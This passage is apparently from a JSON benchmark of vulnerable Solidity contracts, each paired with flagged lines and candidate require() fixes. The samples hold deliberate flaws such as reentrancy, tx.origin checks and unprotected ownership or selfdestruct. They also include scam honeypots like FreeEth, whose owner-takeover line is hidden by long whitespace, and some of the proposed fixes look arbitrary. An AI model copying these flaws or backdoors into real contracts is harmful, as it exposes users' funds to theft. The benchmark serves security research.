            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\n pragma solidity ^0.4.18;\n\ncontract MultiplicatorX4\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n    \n    function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n}",
            {
                "VL": [
                    28,
                    "require(msg.value>=1000000000000000000);"
                ],
                "pre": [
                    27,
                    "require(msg.value>=1000000000000000000);"
                ],
                "post": [
                    30,
                    "require(msg.sender==adr);"
                ]
            }
        ]
    ],
    "0xdb1c55f6926e7d847ddf8678905ad871a68199d2.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 39\n */\n\npragma solidity ^0.4.19;\n\ncontract FreeEth\n{\n    address public Owner = msg.sender;\n   \n    function() public payable{}\n   \n    function GetFreebie()\n    public\n    payable\n    {                                                                    \n        if(msg.value>1 ether)\n        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Owner.transfer(this.balance);\n            msg.sender.transfer(this.balance);\n        }                                                                                                                \n    }\n    \n    function withdraw()\n    payable\n    public\n    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Owner=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n    \n    function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n\n        adr.call.value(msg.value)(data);\n    }\n}",
            {
                "VL": [
                    38,
                    "require(msg.value>0);"
                ],
                "pre": [
                    37,
                    "require(msg.value>0);"
                ],
                "post": [
                    40,
                    "require(adr.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "0x4051334adc52057aca763453820cb0e045076ef3.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract airdrop{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    15,
                    "require(caddress.call(id,from,_tos[i],v));"
                ],
                "pre": [
                    12,
                    "require(msg.sender==from);"
                ],
                "post": [
                    19,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xa1fceeff3acc57d257b917e30c4df661401d6431.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 31\n */\n\npragma solidity ^0.4.18;\n\ncontract AirDropContract{\n\n    function AirDropContract() public {\n    }\n\n    modifier validAddress( address addr ) {\n        require(addr != address(0x0));\n        require(addr != address(this));\n        _;\n    }\n    \n    function transfer(address contract_address,address[] tos,uint[] vs)\n        public \n        validAddress(contract_address)\n        returns (bool){\n\n        require(tos.length > 0);\n        require(vs.length > 0);\n        require(tos.length == vs.length);\n        bytes4 id = bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i = 0 ; i < tos.length; i++){\n\n            contract_address.call(id, msg.sender, tos[i], vs[i]);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    30,
                    "require(contract_address.call(id,msg.sender,tos[i],vs[i]));"
                ],
                "pre": [
                    24,
                    "require(msg.sender==contract_address);"
                ],
                "post": [
                    34,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy  {\n    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;\n    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } \n    function proxy(address target, bytes data) public payable {\n\n        target.call.value(msg.value)(data);\n    }\n}\n\ncontract VaultProxy is Proxy {\n    address public Owner;\n    mapping (address => uint256) public Deposits;\n\n    function () public payable { }\n    \n    function Vault() public payable {\n        if (msg.sender == tx.origin) {\n            Owner = msg.sender;\n            deposit();\n        }\n    }\n    \n    function deposit() public payable {\n        if (msg.value > 0.5 ether) {\n            Deposits[msg.sender] += msg.value;\n        }\n    }\n    \n    function withdraw(uint256 amount) public onlyOwner {\n        if (amount>0 && Deposits[msg.sender]>=amount) {\n            msg.sender.transfer(amount);\n        }\n    }\n}",
            {
                "VL": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    13,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    15,
                    "require(target.call.value(msg.value)(data));"
                ]
            }
        ]
    ],
    "mishandled.sol": [
        [
            "/*\n * @source: https://github.com/seresistvanandras/EthBench/blob/master/Benchmark/Simple/mishandled.sol \n * @author: -\n * @vulnerable_at_lines: 14\n */\n\npragma solidity ^0.4.0;\ncontract SendBack {\n    mapping (address => uint) userBalances;\n    function withdrawBalance() {  \n\t\tuint amountToWithdraw = userBalances[msg.sender];\n\t\tuserBalances[msg.sender] = 0;\n\n\t\tmsg.sender.send(amountToWithdraw);\n\t}\n}",
            {
                "VL": [
                    13,
                    "require(amountToWithdraw>0);"
                ],
                "pre": [
                    11,
                    "require(userBalances[msg.sender]>0);"
                ],
                "post": [
                    15,
                    "require(msg.sender.send(amountToWithdraw));"
                ]
            }
        ]
    ],
    "0xa46edd6a9a93feec36576ee5048146870ea2c3ae.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.18;\n\ncontract EBU{\n    \n    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v[i]);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    15,
                    "require(caddress.call(id,from,_tos[i],v[i]));"
                ],
                "pre": [
                    12,
                    "require(msg.sender==from);"
                ],
                "post": [
                    19,
                    "require(false);"
                ]
            }
        ]
    ],
    "0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol": [
        [
            "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 16\n */\n\npragma solidity ^0.4.24;\n \ncontract demo{\n    \n    function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n        require(_tos.length > 0);\n        bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n        for(uint i=0;i<_tos.length;i++){\n\n            caddress.call(id,from,_tos[i],v);\n        }\n        return true;\n    }\n}",
            {
                "VL": [
                    15,
                    "require(caddress.call(id,from,_tos[i],v));"
                ],
                "pre": [
                    12,
                    "require(msg.sender==from);"
                ],
                "post": [
                    19,
                    "require(false);"
                ]
            }
        ]
    ],
    "proxy.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-112#proxysol\n * @author: -\n * @vulnerable_at_lines: 19\n */\n\npragma solidity ^0.4.24;\n\ncontract Proxy {\n\n  address owner;\n\n  constructor() public {\n    owner = msg.sender;\n  }\n\n  function forward(address callee, bytes _data) public {\n\n    require(callee.delegatecall(_data)); //Use delegatecall with caution and make sure to never call into untrusted contracts\n  }\n\n}",
            {
                "VL": [
                    18,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    18,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    20,
                    "require(msg.sender==owner);"
                ]
            }
        ]
    ],
    "mapping_write.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#mapping-writesol\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 20\n */\n\n pragma solidity ^0.4.24;\n\n //This code is derived from the Capture the Ether https://capturetheether.com/challenges/math/mapping/\n\n contract Map {\n     address public owner;\n     uint256[] map;\n\n     function set(uint256 key, uint256 value) public {\n         if (map.length <= key) {\n             map.length = key + 1;\n         }\n\n         map[key] = value;\n     }\n\n     function get(uint256 key) public view returns (uint256) {\n         return map[key];\n     }\n     function withdraw() public{\n       require(msg.sender == owner);\n       msg.sender.transfer(address(this).balance);\n     }\n }",
            {
                "VL": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    16,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    21,
                    "require(msg.sender==owner);"
                ]
            }
        ]
    ],
    "incorrect_constructor_name3.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name2sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 17\n */\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    function Constructor()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n\n}",
            {
                "VL": [
                    16,
                    "require(msg.value>=1ether);"
                ],
                "pre": [
                    10,
                    "require(msg.value>=1ether);"
                ],
                "post": [
                    32,
                    "require(msg.sender==owner);"
                ]
            }
        ]
    ],
    "unprotected0.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/unprotected_function/Unprotected.sol\n * @author: -\n * @vulnerable_at_lines: 25\n */\n\n pragma solidity ^0.4.15;\n\n contract Unprotected{\n     address private owner;\n\n     modifier onlyowner {\n         require(msg.sender==owner);\n         _;\n     }\n\n     function Unprotected()\n         public\n     {\n         owner = msg.sender;\n     }\n\n     // This function should be protected\n\n     function changeOwner(address _newOwner)\n         public\n     {\n        owner = _newOwner;\n     }\n\n    /*\n    function changeOwner_fixed(address _newOwner)\n         public\n         onlyowner\n     {\n        owner = _newOwner;\n     }\n     */\n }",
            {
                "VL": [
                    24,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    10,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    39,
                    "require(msg.sender==owner);"
                ]
            }
        ]
    ],
    "FibonacciBalance.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 31,38\n */\n\n//added pragma version\npragma solidity ^0.4.22;\n\ncontract FibonacciBalance {\n\n    address public fibonacciLibrary;\n    // the current fibonacci number to withdraw\n    uint public calculatedFibNumber;\n    // the starting fibonacci sequence number\n    uint public start = 3;\n    uint public withdrawalCounter;\n    // the fibonancci function selector\n    bytes4 constant fibSig = bytes4(sha3(\"setFibonacci(uint256)\"));\n\n    // constructor - loads the contract with ether\n    constructor(address _fibonacciLibrary) public payable {\n        fibonacciLibrary = _fibonacciLibrary;\n    }\n\n    function withdraw() {\n        withdrawalCounter += 1;\n        // calculate the fibonacci number for the current withdrawal user\n        // this sets calculatedFibNumber\n\n        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));\n        msg.sender.transfer(calculatedFibNumber * 1 ether);\n    }\n\n    // allow users to call fibonacci library functions\n    function() public {\n\n        require(fibonacciLibrary.delegatecall(msg.data));\n    }\n}\n\n// library contract - calculates fibonacci-like numbers;\ncontract FibonacciLib {\n    // initializing the standard fibonacci sequence;\n    uint public start;\n    uint public calculatedFibNumber;\n\n    // modify the zeroth number in the sequence\n    function setStart(uint _start) public {\n        start = _start;\n    }\n\n    function setFibonacci(uint n) public {\n        calculatedFibNumber = fibonacci(n);\n    }\n\n    function fibonacci(uint n) internal returns (uint) {\n        if (n == 0) return start;\n        else if (n == 1) return start + 1;\n        else return fibonacci(n - 1) + fibonacci(n - 2);\n    }\n}",
            {
                "VL": [
                    30,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    27,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    33,
                    "require(calculatedFibNumber*1ether==msg.value);"
                ]
            }
        ],
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 31,38\n */\n\n//added pragma version\npragma solidity ^0.4.22;\n\ncontract FibonacciBalance {\n\n    address public fibonacciLibrary;\n    // the current fibonacci number to withdraw\n    uint public calculatedFibNumber;\n    // the starting fibonacci sequence number\n    uint public start = 3;\n    uint public withdrawalCounter;\n    // the fibonancci function selector\n    bytes4 constant fibSig = bytes4(sha3(\"setFibonacci(uint256)\"));\n\n    // constructor - loads the contract with ether\n    constructor(address _fibonacciLibrary) public payable {\n        fibonacciLibrary = _fibonacciLibrary;\n    }\n\n    function withdraw() {\n        withdrawalCounter += 1;\n        // calculate the fibonacci number for the current withdrawal user\n        // this sets calculatedFibNumber\n\n        require(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));\n        msg.sender.transfer(calculatedFibNumber * 1 ether);\n    }\n\n    // allow users to call fibonacci library functions\n    function() public {\n\n        require(fibonacciLibrary.delegatecall(msg.data));\n    }\n}\n\n// library contract - calculates fibonacci-like numbers;\ncontract FibonacciLib {\n    // initializing the standard fibonacci sequence;\n    uint public start;\n    uint public calculatedFibNumber;\n\n    // modify the zeroth number in the sequence\n    function setStart(uint _start) public {\n        start = _start;\n    }\n\n    function setFibonacci(uint n) public {\n        calculatedFibNumber = fibonacci(n);\n    }\n\n    function fibonacci(uint n) internal returns (uint) {\n        if (n == 0) return start;\n        else if (n == 1) return start + 1;\n        else return fibonacci(n - 1) + fibonacci(n - 2);\n    }\n}",
            {
                "VL": [
                    37,
                    "require(msg.sender==fibonacciLibrary);"
                ],
                "pre": [
                    37,
                    "require(msg.sender==fibonacciLibrary);"
                ],
                "post": [
                    39,
                    "require(fibonacciLibrary.delegatecall(fibSig,withdrawalCounter));"
                ]
            }
        ]
    ],
    "mycontract.sol": [
        [
            "/*\n * @source: https://consensys.github.io/smart-contract-best-practices/recommendations/#avoid-using-txorigin\n * @author: Consensys Diligence\n * @vulnerable_at_lines: 20\n * Modified by Gerhard Wagner\n */\n\npragma solidity ^0.4.24;\n\ncontract MyContract {\n\n    address owner;\n\n    function MyContract() public {\n        owner = msg.sender;\n    }\n\n    function sendTo(address receiver, uint amount) public {\n\n        require(tx.origin == owner);\n        receiver.transfer(amount);\n    }\n\n}",
            {
                "VL": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    22,
                    "require(msg.sender.balance>=amount);"
                ]
            }
        ]
    ],
    "simple_suicide.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/unprotected_critical_functions/simple_suicide.sol\n * @author: -\n * @vulnerable_at_lines: 12,13\n */\n\n//added prgma version\npragma solidity ^0.4.0;\n\ncontract SimpleSuicide {\n\n  function sudicideAnyone() {\n    selfdestruct(msg.sender);\n  }\n\n}",
            {
                "VL": [
                    11,
                    "require(msg.sender==tx.origin);"
                ],
                "pre": [
                    11,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    16,
                    "require(msg.sender==tx.origin);"
                ]
            }
        ]
    ],
    "incorrect_constructor_name2.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-118#incorrect-constructor-name1sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 18\n */\n\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    function missing()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n}",
            {
                "VL": [
                    17,
                    "require(msg.value>0);"
                ],
                "pre": [
                    11,
                    "require(msg.value>0);"
                ],
                "post": [
                    32,
                    "require(msg.sender==owner);"
                ]
            }
        ]
    ],
    "rubixi.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/Rubixi_source_code/Rubixi.sol\n * @author: -\n* @vulnerable_at_lines: 23,24\n */\n\n // 0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code\n pragma solidity ^0.4.15;\n\n contract Rubixi {\n\n         //Declare variables for storage critical to contract\n         uint private balance = 0;\n         uint private collectedFees = 0;\n         uint private feePercent = 10;\n         uint private pyramidMultiplier = 300;\n         uint private payoutOrder = 0;\n\n         address private creator;\n\n         //Sets creator\n\n         function DynamicPyramid() {\n                 creator = msg.sender; //anyone can call this\n         }\n\n         modifier onlyowner {\n                 if (msg.sender == creator) _;\n         }\n\n         struct Participant {\n                 address etherAddress;\n                 uint payout;\n         }\n\n         Participant[] private participants;\n\n         //Fallback function\n         function() {\n                 init();\n         }\n\n         //init function run on fallback\n         function init() private {\n                 //Ensures only tx with value of 1 ether or greater are processed and added to pyramid\n                 if (msg.value < 1 ether) {\n                         collectedFees += msg.value;\n                         return;\n                 }\n\n                 uint _fee = feePercent;\n                 //50% fee rebate on any ether value of 50 or greater\n                 if (msg.value >= 50 ether) _fee /= 2;\n\n                 addPayout(_fee);\n         }\n\n         //Function called for valid tx to the contract\n         function addPayout(uint _fee) private {\n                 //Adds new address to participant array\n                 participants.push(Participant(msg.sender, (msg.value * pyramidMultiplier) / 100));\n\n                 //These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan\n                 if (participants.length == 10) pyramidMultiplier = 200;\n                 else if (participants.length == 25) pyramidMultiplier = 150;\n\n                 // collect fees and update contract balance\n                 balance += (msg.value * (100 - _fee)) / 100;\n                 collectedFees += (msg.value * _fee) / 100;\n\n                 //Pays earlier participiants if balance sufficient\n                 while (balance > participants[payoutOrder].payout) {\n                         uint payoutToSend = participants[payoutOrder].payout;\n                         participants[payoutOrder].etherAddress.send(payoutToSend);\n\n                         balance -= participants[payoutOrder].payout;\n                         payoutOrder += 1;\n                 }\n         }\n\n         //Fee functions for creator\n         function collectAllFees() onlyowner {\n                 if (collectedFees == 0) throw;\n\n                 creator.send(collectedFees);\n                 collectedFees = 0;\n         }\n\n         function collectFeesInEther(uint _amt) onlyowner {\n                 _amt *= 1 ether;\n                 if (_amt > collectedFees) collectAllFees();\n\n                 if (collectedFees == 0) throw;\n\n                 creator.send(_amt);\n                 collectedFees -= _amt;\n         }\n\n         function collectPercentOfFees(uint _pcent) onlyowner {\n                 if (collectedFees == 0 || _pcent > 100) throw;\n\n                 uint feesToCollect = collectedFees / 100 * _pcent;\n                 creator.send(feesToCollect);\n                 collectedFees -= feesToCollect;\n         }\n\n         //Functions for changing variables related to the contract\n         function changeOwner(address _owner) onlyowner {\n                 creator = _owner;\n         }\n\n         function changeMultiplier(uint _mult) onlyowner {\n                 if (_mult > 300 || _mult < 120) throw;\n\n                 pyramidMultiplier = _mult;\n         }\n\n         function changeFeePercentage(uint _fee) onlyowner {\n                 if (_fee > 10) throw;\n\n                 feePercent = _fee;\n         }\n\n         //Functions to provide information to end-user using JSON interface or other interfaces\n         function currentMultiplier() constant returns(uint multiplier, string info) {\n                 multiplier = pyramidMultiplier;\n                 info = 'This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.';\n         }\n\n         function currentFeePercentage() constant returns(uint fee, string info) {\n                 fee = feePercent;\n                 info = 'Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)';\n         }\n\n         function currentPyramidBalanceApproximately() constant returns(uint pyramidBalance, string info) {\n                 pyramidBalance = balance / 1 ether;\n                 info = 'All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to';\n         }\n\n         function nextPayoutWhenPyramidBalanceTotalsApproximately() constant returns(uint balancePayout) {\n                 balancePayout = participants[payoutOrder].payout / 1 ether;\n         }\n\n         function feesSeperateFromBalanceApproximately() constant returns(uint fees) {\n                 fees = collectedFees / 1 ether;\n         }\n\n         function totalParticipants() constant returns(uint count) {\n                 count = participants.length;\n         }\n\n         function numberOfParticipantsWaitingForPayout() constant returns(uint count) {\n                 count = participants.length - payoutOrder;\n         }\n\n         function participantDetails(uint orderInPyramid) constant returns(address Address, uint Payout) {\n                 if (orderInPyramid <= participants.length) {\n                         Address = participants[orderInPyramid].etherAddress;\n                         Payout = participants[orderInPyramid].payout / 1 ether;\n                 }\n         }\n }",
            {
                "VL": [
                    22,
                    "require(creator==msg.sender);"
                ],
                "pre": [
                    11,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    162,
                    "require(false);"
                ]
            }
        ]
    ],
    "wallet_02_refund_nosub.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-02-refund-nosubsol\n * @author: -\n * @vulnerable_at_lines: 36\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    Unfortunately the developer forgot set the user's balance to 0 when refund() is called.\n    An attacker can pay in a small amount of Ether and call refund() repeatedly to empty the contract.\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n\n     constructor() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n         require(amount <= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     function refund() public {\n\n         msg.sender.transfer(balances[msg.sender]);\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }",
            {
                "VL": [
                    35,
                    "require(balances[msg.sender]>0);"
                ],
                "pre": [
                    35,
                    "require(balances[msg.sender]>0);"
                ],
                "post": [
                    37,
                    "require(balances[msg.sender]==0);"
                ]
            }
        ]
    ],
    "wallet_03_wrong_constructor.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-03-wrong-constructorsol\n * @author: -\n * @vulnerable_at_lines: 19,20\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    The constructor is wrongly named, so anyone can become 'creator' and withdraw all funds.\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n     \n\n     function initWallet() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n         require(amount <= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }",
            {
                "VL": [
                    18,
                    "require(msg.sender==creator);"
                ],
                "pre": [
                    14,
                    "require(msg.sender==tx.origin);"
                ],
                "post": [
                    41,
                    "require(msg.sender==creator);"
                ]
            }
        ]
    ],
    "wallet_04_confused_sign.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-105#wallet-04-confused-signsol\n * @author: -\n * @vulnerable_at_lines: 30\n */\n\n pragma solidity ^0.4.24;\n\n /* User can add pay in and withdraw Ether.\n    Unfortunatelty, the developer was drunk and used the wrong comparison operator in \"withdraw()\"\n    Anybody can withdraw arbitrary amounts of Ether :()\n */\n\n contract Wallet {\n     address creator;\n\n     mapping(address => uint256) balances;\n\n     constructor() public {\n         creator = msg.sender;\n     }\n\n     function deposit() public payable {\n         assert(balances[msg.sender] + msg.value > balances[msg.sender]);\n         balances[msg.sender] += msg.value;\n     }\n\n     function withdraw(uint256 amount) public {\n\n         require(amount >= balances[msg.sender]);\n         msg.sender.transfer(amount);\n         balances[msg.sender] -= amount;\n     }\n\n     // In an emergency the owner can migrate  allfunds to a different address.\n\n     function migrateTo(address to) public {\n         require(creator == msg.sender);\n         to.transfer(this.balance);\n     }\n\n }",
            {
                "VL": [
                    29,
                    "require(amount>0);"
                ],
                "pre": [
                    29,
                    "require(msg.sender==creator);"
                ],
                "post": [
                    33,
                    "require(balances[msg.sender]>=0);"
                ]
            }
        ]
    ],
    "multiowned_vulnerable.sol": [
        [
            "/*\n * @source: https://github.com/SmartContractSecurity/SWC-registry/blob/master/test_cases/solidity/unprotected_critical_functions/multiowned_vulnerable/multiowned_vulnerable.sol\n * @author: -\n * @vulnerable_at_lines: 38\n */\n\npragma solidity ^0.4.23;\n\n/**\n * @title MultiOwnable\n */\ncontract MultiOwnable {\n  address public root;\n  mapping (address => address) public owners; // owner => parent of owner\n\n  /**\n  * @dev The Ownable constructor sets the original `owner` of the contract to the sender\n  * account.\n  */\n  constructor() public {\n    root = msg.sender;\n    owners[root] = root;\n  }\n\n  /**\n  * @dev Throws if called by any account other than the owner.\n  */\n  modifier onlyOwner() {\n    require(owners[msg.sender] != 0);\n    _;\n  }\n\n  /**\n  * @dev Adding new owners\n  * Note that the \"onlyOwner\" modifier is missing here.\n  */\n\n  function newOwner(address _owner) external returns (bool) {\n    require(_owner != 0);\n    owners[_owner] = msg.sender;\n    return true;\n  }\n\n  /**\n    * @dev Deleting owners\n    */\n  function deleteOwner(address _owner) onlyOwner external returns (bool) {\n    require(owners[_owner] == msg.sender || (owners[_owner] != 0 && msg.sender == root));\n    owners[_owner] = 0;\n    return true;\n  }\n}\n\ncontract TestContract is MultiOwnable {\n\n  function withdrawAll() onlyOwner {\n    msg.sender.transfer(this.balance);\n  }\n\n  function() payable {\n  }\n\n}",
            {
                "VL": [
                    37,
                    "require(owners[msg.sender]==root);"
                ],
                "pre": [
                    13,
                    "require(msg.sender!=address(0));"
                ],
                "post": [
                    52,
                    "require(owners[_owner]!=0);"
                ]
            }
        ]
    ],
    "phishable.sol": [
        [
            "/*\n * @source: https://github.com/sigp/solidity-security-blog\n * @author: -\n * @vulnerable_at_lines: 20\n */\n\n pragma solidity ^0.4.22;\n\n contract Phishable {\n    address public owner;\n\n    constructor (address _owner) {\n        owner = _owner;\n    }\n\n    function () public payable {} // collect ether\n\n    function withdrawAll(address _recipient) public {\n\n        require(tx.origin == owner);\n        _recipient.transfer(this.balance);\n    }\n}",
            {
                "VL": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    22,
                    "require(msg.sender.balance>0);"
                ]
            }
        ]
    ],
    "arbitrary_location_write_simple.sol": [
        [
            "/*\n * @source: https://smartcontractsecurity.github.io/SWC-registry/docs/SWC-124#arbitrary-location-write-simplesol\n * @author: Suhabe Bugrara\n * @vulnerable_at_lines: 27\n */\n\n pragma solidity ^0.4.25;\n\n contract Wallet {\n     uint[] private bonusCodes;\n     address private owner;\n\n     constructor() public {\n         bonusCodes = new uint[](0);\n         owner = msg.sender;\n     }\n\n     function () public payable {\n     }\n\n     function PushBonusCode(uint c) public {\n         bonusCodes.push(c);\n     }\n\n     function PopBonusCode() public {\n\n         require(0 <= bonusCodes.length); // this condition is always true since array lengths are unsigned\n         bonusCodes.length--; // an underflow can be caused here\n     }\n\n     function UpdateBonusCodeAt(uint idx, uint c) public {\n         require(idx < bonusCodes.length);\n         bonusCodes[idx] = c; // write to any index less than bonusCodes.length\n     }\n\n     function Destroy() public {\n         require(msg.sender == owner);\n         selfdestruct(msg.sender);\n     }\n }",
            {
                "VL": [
                    26,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    26,
                    "require(msg.sender==owner);"
                ],
                "post": [
                    29,
                    "require(0<=bonusCodes.length);"
                ]
            }
        ]
    ],
    "incorrect_constructor_name1.sol": [
        [
            "/*\n * @source: https://github.com/trailofbits/not-so-smart-contracts/blob/master/wrong_constructor_name/incorrect_constructor.sol\n * @author: Ben Perez\n * @vulnerable_at_lines: 20\n */\n\npragma solidity ^0.4.24;\n\ncontract Missing{\n    address private owner;\n\n    modifier onlyowner {\n        require(msg.sender==owner);\n        _;\n    }\n\n    // The name of the constructor should be Missing\n    // Anyone can call the IamMissing once the contract is deployed\n\n    function IamMissing()\n        public\n    {\n        owner = msg.sender;\n    }\n\n    function () payable {}\n\n    function withdraw()\n        public\n        onlyowner\n    {\n       owner.transfer(this.balance);\n    }\n}",
            {
                "VL": [
                    19,
                    "require(msg.sender==owner);"
                ],
                "pre": [
                    10,
                    "require(false);"
                ],
                "post": [
                    34,
                    "require(msg.sender.send(this.balance));"
                ]
            }
        ]
    ],
    "odds_and_evens.sol": [
        [
